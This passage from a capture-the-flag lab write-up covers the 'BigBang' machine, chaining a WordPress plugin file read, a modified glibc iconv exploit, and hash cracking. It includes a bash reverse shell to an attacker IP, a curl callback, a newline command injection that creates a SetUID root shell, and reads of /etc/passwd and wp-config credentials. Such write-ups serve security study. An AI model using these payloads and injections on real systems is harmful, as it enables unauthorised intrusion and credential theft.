> Any side effects from `__wakeup()`, `__destruct()`, etc. that were triggered during/after unserialization of metadata when the phar is loaded will stop happening, and will only happen when `getMetadata()` is directly called.

That is an end to this line of attack.

---

## glibc Buffer Overflow

### CVE-2024-2961

This post from Ambionics Security goes into a ton of detail about how a researcher found a 24-year-old buffer overflow in the iconv API in glibc by fuzzing PHP filters.
The bug was impossible to actually exploit, except via PHP!

The post explains in detail and ends with an example using it with **CVE-2023-26326** in BuddyForms v2.7.7:

That’s basically the exact same setup as BigBang (even with the same image on the website).

The vulnerability can be triggered by sending a series of PHP filters, but to calculate the data necessary for remote code execution, it must know portions of memory available in `/proc/self/maps`.
There is a POC skeleton that can be updated to reflect how to upload files and then access them, and then it will perform the rest of the exploit.

---

## Read GIF with file://

To make this work, I need to be able to read files.
I have CVE-2023-26326 which allows me to give WordPress a URL, and if it is a GIF, it copies that to the WordPress uploads folder.

I want to find a `.gif` file in the BigBang container to see if I can read it.
It’s easy enough to spin up a Docker container from the php family.
Since WordPress runs on Apache, there’s a container of the name/tag `php:<version>-apache`.
I’ll run:

```bash
(myenv)─(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] docker run -d php:8.3.2-apache
```

Output:

```
Unable to find image 'php:8.3.2-apache' locally
... [download progress] ...
Status: Downloaded newer image for php:8.3.2-apache
5323f1453a8b2e3857a1053e2cb39ffe7423f0a234366bcaa72b26103a9a66a8
```

Then:

```bash
(myenv)─(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] docker exec -it 5323f1453a8b2e3857a1053e2cb39ffe7423f0a234366bcaa72b26103a9a66a8 bash
root@5323f1453a8b:/var/www/html#
```

Get the path of a GIF:

```bash
root@5323f1453a8b:/var/www/html# find / -name '*.gif' 2>/dev/null | head

/usr/share/apache2/icons/pie7.gif  
/usr/share/apache2/icons/tar.gif  
/usr/share/apache2/icons/link.gif  
/usr/share/apache2/icons/forward.gif  
/usr/share/apache2/icons/transfer.gif  
/usr/share/apache2/icons/broken.gif  
/usr/share/apache2/icons/alert.red.gif  
/usr/share/apache2/icons/burst.gif  
/usr/share/apache2/icons/pie1.gif  
/usr/share/apache2/icons/ball.red.gif  
```

![GIF Found](image-20250130171504266)

It works! That reads a file from the host system and copies it onto the webserver.

---

## Read With wrapwrap

Knowing that works, I’ll try to read `/etc/hostname`:

![Attempt Hostname Read](image-20250130171652463)

It’s failing because the magic bytes for the file don’t match that of a GIF.

I can try things like filters to base64, but unless the resulting data starts with `GIF87a` or `GIF89a`, it’s going to return that same error.

The same author that found the buffer overflow in glibc had earlier written a tool named **wrapwrap** that uses PHP filters to prefix data.
In the example, if data is fetched and then parsed as JSON, you can prefix it with `{"<key>": "` and a suffix of `"}"` to get the data to process correctly.
Here, I can prepend the GIF magic bytes.

I’ll use wrapwrap to append the six-byte magic to the front of `/etc/hosts`:

```bash
(myenv)─(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] python wrapwrap.py /etc/hosts "GIF89a" "" 1000

[!] Ignoring nb_bytes value since there is no suffix  
[+] Wrote filter chain to chain.txt (size=1443).
```

Chain contents:

```
php://filter/convert.base64-encode|convert.iconv.855.UTF7|...|convert.base64-decode/resource=/etc/hosts
```

I’ll pass that chain as the `url` parameter and send again:

![Chain Success](image-20250131065212064)

Now that file has the hosts file:

```bash
(myenv)─(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] curl http://blog.bigbang.htb/wp-content/uploads/2025/01/1-7.png -o-
GIF89a127.0.0.1 localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.3      bf9a078
```

It starts with the “GIF89a” which I can ignore.

---

I’m also suspicious of that hostname, which seems short for a Docker container.
I would have expected 12 characters, and it’s seven.
I think the last six characters (five missing in hostname plus trailing newline) might have been lost somehow in the filtering.
To test this, I’ll re-run wrapwrap with a longer prefix:

```bash
(myenv)─(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] python wrapwrap.py /etc/hosts "GIF89az0n" "" 1000
[!] Ignoring nb_bytes value since there is no suffix  
[+] Wrote filter chain to chain.txt (size=2619).
```

Chain contents:

```
php://filter/convert.base64-encode|...|convert.base64-decode/resource=/etc/hosts
```

After sending that, the resulting image has six more characters of prefix (not exactly sure why “MM” was added after “z0n”, but filters are weird), and six less characters of the file:

```bash
(myenv)─(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] curl http://blog.bigbang.htb/wp-content/uploads/2025/01/1-8.png -o-
GIF89az0nMM127.0.0.1   localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.3      b
```

This is worth keeping in mind for this file read that I seem to lose the trailing n characters, where n is the number of characters prepended.

I’ll also note that if the filename changes but the prefix doesn’t, the chain from wrapwrap doesn’t change either, other than the end where it says `source=[filename]`.
This saves me from having to run it over and over.

---

## Modify Exploit

There’s a POC skeleton script here.
I’ll download this and save it as `exploit.py`.
It’s using the Python ten exploitation framework, which uses classes and decorators to define the exploit.

---

##  Modifying the Exploit

###  Updated Remote Class Methods

**`send()` function**:

```python
def send(self, path: str) -> Response:
    """Sends given `path` to the HTTP server. Returns the response."""
    url = f"{self.url}/wp-admin/admin-ajax.php"
    data = {
        "action": "upload_image_from_url",
        "url": tf.qs.encode(path),
        "id": 1,
        "accepted_files": "image/gif"
    }
    return self.session.post(url, data=data)
```

**`download()` function**:

```python
def download(self, path: str) -> bytes:
    """Returns the contents of a remote file."""
    gif_chain = "php://filter/convert.base64-encode|convert.iconv.855.UTF7|...|convert.base64-decode/resource="
    response = self.send(f"{gif_chain}{path}")
    url = response.json()["response"]
    if not url.startswith("http"):
        return b""
    content = self.session.get(url).content
    return content[6:]  # Remove GIF magic bytes prefix
```

---

###  Fix Test for Partial Result

```python
def check_token(text: str, path: str) -> bool:
    result = safe_download(path)
    return text.encode().startswith(result)  # Allow for truncation
```

---

###  Fix LIBC Download Padding

```python
def download_file(self, remote_path: str, local_path: str) -> None:
    """Downloads remote file and appends null bytes."""
    data = self.get_file(remote_path) + b"\x00" * 6
    Path(local_path).write_bytes(data)
```

---

###  Fix `get_regions()` for Decoding Issues

```python
def get_regions(self) -> list[Region]:
    """Obtains memory regions by reading /proc/self/maps."""
    maps = self.get_file("/proc/self/maps")
    maps = '\n'.join(maps.decode(errors='ignore').split('\n')[:-1])
    PATTERN = re.compile(
        r"^([a-f0-9]+)-([a-f0-9]+)\b.*\s([-rwx]{3}[ps])\s(.*)"
    )
    # Parsing logic continues...
```

---

##  Exploit Results

✔ Data and `php://filter/` wrappers work
✔ Zlib extension is enabled
✔ Heaps detected

### Blind Exploit Test

```bash
uv run exploit.py http://blog.bigbang.htb id
# Success, no output (blind)

uv run exploit.py http://blog.bigbang.htb 'curl http://10.10.14.6/owned'
# HTTP request detected by attacker webserver

uv run exploit.py http://blog.bigbang.htb 'bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"'
# Reverse shell connected
```

---

## Post-Exploit Shell Access

### Initial Shell Connection

```bash
nc -lnvp 443
# Connection received from 10.10.11.52
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bf9a078a3627:/var/www/html/wordpress/wp-admin$
```

---

###  Shell Upgrade Trick

```bash
www-data@bf9a078a3627:/var/www/html/wordpress/wp-admin$ script /dev/null -c bash
# Script started, output log file is '/dev/null'

^Z
stty raw -echo; fg
# Terminal reset required
reset
Terminal type? screen
www-data@bf9a078a3627:/var/www/html/wordpress/wp-admin$
```

Final shell upgraded to interactive.

---

##  Container Enumeration

### OS Information

```bash
cat /etc/os-release
# Debian GNU/Linux 12 (bookworm)
```

###  Docker Environment

```bash
ls -a /
# .dockerenv file present → confirms containerized environment
```

###  Container IP

```bash
cat /proc/net/fib_trie
# IP: 172.17.0.3
```

---

##  WordPress Directory Structure

```bash
ls /var/www/html/wordpress
# index.php, wp-config.php, wp-admin/, wp-content/, etc.
```

###  Database Connection Info from wp-config.php

```php
DB_NAME: wordpress
DB_USER: wp_user
DB_PASSWORD: wp_password
DB_HOST: 172.17.0.1
```

---

##  Database Enumeration

###  PHP Script to Query DB

```php
<?php
// Connects to DB and executes arbitrary SQL query passed as argument
?>
```

Uploaded and verified working.

---

###  Databases Found

```sql
show databases;
# information_schema
# performance_schema
# wordpress
```

---

###  Tables in wordpress DB

```sql
show tables;
# wp_commentmeta
# wp_comments
# wp_links
# wp_options
# wp_postmeta
# wp_posts
# wp_term_relationships
# wp_term_taxonomy
# wp_termmeta
# wp_terms
# wp_usermeta
# wp_users
```

---

### Dump wp\_users Table

```sql
select * from wp_users;
# User1: root
# User2: shawking
```

Sample output:

```json
{
    "ID": "3",
    "user_login": "shawking",
    "user_pass": "$P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./",
    "user_email": "shawking@bigbang.htb"
}
```

---

##  Cracking WordPress Hashes

###  Save Hashes for Cracking

```
root:$P$Beh5HLRUlTi1LpLEAstRyXaaBOJICj1
shawking:$P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./
```

### Hashcat Usage

```bash
hashcat wphashes rockyou.txt --user
```

✔ Found password for shawking:

```
quantumphysics
```

---

##  SSH Access with Cracked Password

```bash
sshpass -p 'quantumphysics' ssh shawking@bigbang.htb
```

✔ Connected successfully
✔ Captured user flag:

```bash
cat user.txt
# ad2f85e7************************
```

---

## Shell as Developer

### Enumeration

#### Users

`shawking` cannot run sudo:

```bash
$ sudo -l
[sudo] password for shawking: 
Sorry, user shawking may not run sudo on bigbang.
```

There is another user with a home directory: `developer`.

```bash
$ ls /home
developer  shawking
```

From `/etc/passwd`, we see:

```bash
$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
shawking:x:1001:1001:Stephen Hawking,,,:/home/shawking:/bin/bash
developer:x:1002:1002:,,,:/home/developer:/bin/bash
```

#### Listening Ports

```bash
$ netstat -tnl
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 172.17.0.1:3306         0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:42571         0.0.0.0:*               LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
tcp6       0      0 :::80                   :::*                    LISTEN 
```

#### Satellite App (Port 9090)

```bash
$ curl localhost:9090 -v
> GET / HTTP/1.1
< HTTP/1.1 404 NOT FOUND
< Server: Werkzeug/3.0.3 Python/3.10.12
```

Process list shows:

```bash
$ ps aux | grep python
root        1768  0.0  ... /usr/bin/python3 /root/satellite/app.py
```

#### Grafana (Port 3000)

```bash
$ curl -v localhost:3000
< HTTP/1.1 302 Found
< Location: /login
```

```bash
$ curl localhost:3000/login
<!DOCTYPE html> ... <title>Grafana</title> ...
```

Data located in `/opt/data/grafana.db`. Developer has access.

### Shell

#### Recover Grafana Password Hash

Copied database out:

```bash
$ sshpass -p 'quantumphysics' scp developer@bigbang.htb:/opt/data/grafana.db .
```

Extracted user table:

```sql
select * from user;
```

Reveals user `developer` with:

* login: developer
* hash: `7e8018a4...c59db93577b12201c0151256375d6f883f1b8d960`
* salt: `4umebBJucv`

Converted to hashcat format using `grafana2hashcat.py`.

Ran hashcat:

```bash
$ hashcat -m 10900 grafanahashes rockyou.txt
```

Discovered password:
`bigbang`

#### Access Developer Account

```bash
$ su - developer
Password: bigbang
developer@bigbang:~$
```

Also via SSH:

```bash
$ sshpass -p 'bigbang' ssh developer@bigbang.htb
developer@bigbang:~$
```

### Shell as Root

#### Enumeration

In developer home:

```bash
$ ls ~/android
satellite-app.apk
```

Downloaded the APK:

```bash
$ sshpass -p bigbang scp developer@bigbang.htb:~/android/satellite-app.apk .
```

#### APK Analysis

Used JADX GUI → Found endpoints:

* `/login`
* `/command`

Communicates with `app.bigbang.htb:9090`.

#### Test Login Endpoint

Configured local tunnel:

```bash
$ ssh -L 9090:localhost:9090 shawking@bigbang.htb
```

Added to `/etc/hosts`:
`127.0.0.1 app.bigbang.htb`

Attempted login with wrong creds:

```bash
$ curl app.bigbang.htb:9090/login \
  -d '{"username": "z0n", "password": "z0n"}' \
  -H "Content-Type: application/json"
{"error":"Bad username or password"}
```

Then tested developer credentials:

```bash
$ token=$(curl -s app.bigbang.htb:9090/login \
  -d '{"username": "developer", "password": "bigbang"}' \
  -H "Content-Type: application/json" | jq -r .access_token)
```

#### Interact with /command Endpoint

Test without token:

```bash
$ curl -d '{"test": "1"}' -H "Content-Type: application/json" app.bigbang.htb:9090/command
{"msg":"Missing Authorization Header"}
```

Test with token:

```bash
$ curl -d '{"test": "1"}' -H "Content-Type: application/json" -H "Authorization: Bearer $token" app.bigbang.htb:9090/command
{"error":"Invalid command"}
```

Test valid command:

```bash
$ curl -d '{"command": "move", "x": 1, "y": 2, "z": 3}' \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $token" \
  app.bigbang.htb:9090/command
{"status":"developer is moving to coordinates (1.0, 2.0, 3.0)"}
```

#### TakePictureActivity

```bash
$ curl -d '{"command": "send_image", "output_file": "test.png"}' \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $token" \
  app.bigbang.htb:9090/command
{"error":"Error generating image: "}
```


## Command Injection

### Bad Characters

When trying to inject a command via `output_file`, the server blocks dangerous characters:

```bash
$ curl app.bigbang.htb:9090/command \
  -d '{"command": "send_image", "output_file": "test.png; id"}' \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $token"
{"error":"Output file path contains dangerous characters"}
```

#### Fuzzing for Blocked Characters

Used `ffuf` to test for filtered characters:

```bash
$ ffuf -u http://app.bigbang.htb:9090/command \
  -d '{"command": "send_image", "output_file": "test.pngFUZZ"}' \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $token" \
  -w /opt/SecLists/Fuzzing/alphanum-case-extra.txt \
  -mr dangerous
```

Blocked characters found:

```
' " % $ ) ( > # & ? ; < [ ] ^ ` { } |
```

### Newline Injection

Because the backend uses Python with `subprocess.run(..., shell=True)`, newline characters allow command injection:

```python
>>> subprocess.run("echo 'legit command'\nid", shell=True)
legit command
uid=1000(oxdf) gid=1000(oxdf) groups=1000(oxdf),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),117(lpadmin),984(docker),987(vboxsf)
```

#### Proof of Concept

Sent a ping command to my listener:

```bash
$ curl app.bigbang.htb:9090/command \
  -d '{"command": "send_image", "output_file": "test.png\nping -c 1 10.10.14.6"}' \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $token"
{"error":"Error reading image file: [Errno 2] No such file or directory: 'test.png\\nping -c 1 10.10.14.6'"}
```

Observed ICMP packets on my interface:

```bash
$ sudo tcpdump -ni tun0 icmp
20:49:41.327708 IP 10.10.11.52 > 10.10.14.6: ICMP echo request
20:49:41.327728 IP 10.10.14.6 > 10.10.11.52: ICMP echo reply
```

### Getting a Root Shell

Injected commands to copy bash and set it as SetUID:

```bash
$ curl app.bigbang.htb:9090/command \
  -d '{"command": "send_image", "output_file": "test.png\ncp /bin/bash /tmp/z0n\nchmod 6777 /tmp/z0n"}' \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $token"
{"error":"Error reading image file: [Errno 2] No such file or directory: 'test.png\\ncp /bin/bash /tmp/z0n\\nchmod 6777 /tmp/z0n'"}
```

Spawned a root shell:

```bash
$ /tmp/z0n -p
z0n-5.1#
```

Retrieved root flag:

```bash
$ cat /root/root.txt
c3065984************************
```

